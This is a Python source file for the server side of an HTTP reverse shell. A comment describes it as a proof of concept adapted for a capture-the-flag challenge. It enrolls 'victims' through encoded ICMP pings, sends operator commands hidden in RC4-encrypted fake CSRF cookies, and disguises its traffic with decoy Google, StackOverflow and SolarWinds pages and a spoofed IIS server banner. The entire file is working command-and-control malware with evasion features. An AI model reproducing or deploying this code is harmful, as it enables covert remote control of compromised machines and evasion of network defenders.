#!/usr/bin/python
# -*- coding: utf-8 -*-

# HTTP ASYNCHRONE REVERSE SHELL
# Version : 0.1 POC
# Git : https://github.com/onSec-fr
# Modified to fit a ctf challenge

from http.server import BaseHTTPRequestHandler, HTTPServer
import os
import base64
import threading
import sys
import random
from pwn import xor
import socket
from rc4 import encrypt as rc4Encrypt
from rc4 import decrypt as rc4Decrypt
# Config
PORT = 80
VICTIMS = {
    "IP": {
        "ID": "ID-Dummy_Victim",
        "KEY": None,
    }
}
CMD = ""


def rotate(key, plaintext, encrypt=True):
    rotated = []
    for char in plaintext:
        if encrypt:
            rotated.append(chr((char+key) % 256))
        else:
            rotated.append(chr((char-key) % 256))
    return "".join(rotated)


def getVictimID(data):
    key = xor(data[28:30], "ID")
    ID = xor(data[28:], key)[:33]
    key = (key[1] << 8) + key[0]
    try:
        return key, ID.decode()
    except:
        return -1, ""


def getNewTarget():
    global VICTIMS
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    s.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)
    while 1:
        data, addr = s.recvfrom(1508)
        if data[20] == 8:  # Checks if packet of echo request
            key, ID = getVictimID(data)
            if key != -1:
                VICTIMS[addr[0]] = {
                    "ID": ID,
                    "KEY": key
                }
                print(Colors.GREEN +
                      f"NEW VICTIM[{addr[0]}]:{ID}:{key}" + Colors.END)
                InitConn()


class MyHandler(BaseHTTPRequestHandler):

    # Custom headers
    def _set_headers(self, cookie):
        self.send_header("Cache-Control", "private, max-age=0")
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Vary", "Accept-Encoding")
        if cookie:
            self.send_header("Set-Cookie", f"csrftoken=%{cookie}")
        self.send_header("Connection", "close")
        self.end_headers()

    # GET events
    def do_GET(self):
        global CMD
        if (self.path.startswith("/search") or self.path.startswith("/news") or self.path.startswith("/images") or self.path.startswith("/videos")) and self.client_address[0] in VICTIMS:
            # If client say hello, then reply hello if FOUND in is a victim(first connection)
            # print("COOKIE:", self.getCookie())
            if self.decryptCookie(self.getCookie())[:5] == "HELLO":
                print(Colors.GREEN + '[!] Connection established with ' +
                      self.client_address[0] + "\n" + Colors.END)
                self.send_response(200)
                cmd = 'HELLO'
                encodedCmd = self.encryptCookie(cmd)
                self._set_headers(encodedCmd)
                outfile = getFile(self.path)
                try:
                    self.wfile.write(outfile)
                except:
                    print("socket error")
                return 0

            # Client ask for instructions
            elif self.decryptCookie(self.getCookie())[:3] == "ASK":
                self.send_response(200)
                if len(CMD):
                    self._set_headers(self.encryptCookie(CMD))
                    CMD = ""
                else:
                    self._set_headers(self.encryptCookie("IDLE"))
                print(Colors.YELLOW + "ASKED FOR CMD" + Colors.YELLOW)
                outfile = getFile(self.path)
                try:
                    self.wfile.write(outfile)
                except:
                    print("socket error")
                return 0
            # Client reply with output
            else:
                resp = self.decryptCookie(self.getCookie())
                if resp == "EXIT OK":
                    stop_server()
                else:
                    print(Colors.LIGHT_WHITE + "\n" +
                          resp.replace("\n", "") + Colors.END)
                    self.send_response(200)
                    self._set_headers(False)
                    outfile = getFile(self.path)
                    CancelWait()
                    try:
                        self.wfile.write(outfile)
                    except:
                        print("socket error")
        else:
            self.send_response(404)
            self._set_headers(False)
            self.wfile.write(b"Not found")

    # Save logs
    log_file = open('../logs/logs.txt', 'w')

    # Encrypt Cookie
    def encryptCookie(self, cmd):
        encrypted = rc4Encrypt(VICTIMS[self.client_address[0]]["ID"][3:], cmd)
        encrypted = rotate(
            VICTIMS[self.client_address[0]]["KEY"], encrypted.encode())
        encrypted = base64.b64encode(encrypted.encode()).decode()
        return encrypted

    # Decrypt Cookie
    def decryptCookie(self, cookie):
        try:
            decrypted = base64.b64decode(cookie)
            decrypted = rotate(VICTIMS[self.client_address[0]]
                               ["KEY"], decrypted, encrypt=False)
            try:
                decrypted = rc4Decrypt(
                    VICTIMS[self.client_address[0]]["ID"][3:], decrypted)
            except Exception as _:
                decrypted = rc4Decrypt(
                    VICTIMS[self.client_address[0]]["ID"][3:], decrypted[1:])
        except:
            return ""
        return decrypted

    def getCookie(self):
        return self.headers['Cookie'].split("csrftoken=")[1]

    def log_message(self, format, *args):
        self.log_file.write(
            "%s - - [%s] %s\n" % (self.client_address[0], self.log_date_time_string(), format % args))


def InitConn():
    global initConn
    initConn = True


def CancelWait():
    global wait
    wait = False

# Choose random template file


def getFile(path):
    fileName = "google"
    if "stackoverflow" in path:
        fileName = "stackoverflow"
    elif "powershell" in path:
        fileName = "ADuser"
    elif "solarwinds" in path:
        fileName = "solarWinds"
    elif "programming" in path:
        fileName = "progMemes"

    with open("../templates/" + fileName, 'rb') as file:
        template = file.read()
    return template


class Colors:
    BLACK = "\033[0;30m"
    RED = "\033[0;31m"
    GREEN = "\033[0;32m"
    BROWN = "\033[0;33m"
    BLUE = "\033[0;34m"
    PURPLE = "\033[0;35m"
    CYAN = "\033[0;36m"
    LIGHT_GRAY = "\033[0;37m"
    DARK_GRAY = "\033[1;30m"
    LIGHT_RED = "\033[1;31m"
    LIGHT_GREEN = "\033[1;32m"
    YELLOW = "\033[1;33m"
    LIGHT_BLUE = "\033[1;34m"
    LIGHT_PURPLE = "\033[1;35m"
    LIGHT_CYAN = "\033[1;36m"
    LIGHT_WHITE = "\033[1;37m"
    BOLD = "\033[1m"
    FAINT = "\033[2m"
    ITALIC = "\033[3m"
    UNDERLINE = "\033[4m"
    BLINK = "\033[5m"
    NEGATIVE = "\033[7m"
    CROSSED = "\033[9m"
    END = "\033[0m"
    if not __import__("sys").stdout.isatty():
        for _ in dir():
            if isinstance(_, str) and _[0] != "_":
                locals()[_] = ""
    else:
        if __import__("platform").system() == "Windows":
            kernel32 = __import__("ctypes").windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
            del kernel32

# Start http server


def start_server():
    global httpd
    print(Colors.BLUE + '[!] Server listening on port ' +
          str(PORT) + ', waiting connection from client...' + Colors.END)
    server_class = HTTPServer
    MyHandler.server_version = "Microsoft-IIS/10.0"
    MyHandler.sys_version = ""
    httpd = server_class(('0.0.0.0', PORT), MyHandler)
    # httpd.socket = ssl.wrap_socket (httpd.socket, certfile=CERT_FILE, server_side=True)
    httpd.serve_forever()

# Exit


def stop_server():
    print(Colors.YELLOW + '[!] Exit' + Colors.END)
    os._exit(1)


if __name__ == '__main__':
    # Init
    initConn = False
    wait = True
    try:
        # Start http server in separate thread
        daemon = threading.Thread(target=start_server)
        daemon.daemon = True
        daemon.start()
        icmp = threading.Thread(target=getNewTarget)
        icmp.daemon = True
        icmp.start()
        # Wait for first connection from client
        while (initConn == False):
            pass
        while True:
            while CMD == "":
                cmd = input("Command> ").strip()
                CMD = cmd
            wait = True
            print(Colors.BLUE + 'Awaiting response ...' + Colors.END)
            # Wait for client's reply
            while (wait == True):
                pass
    except KeyboardInterrupt:
        stop_server()
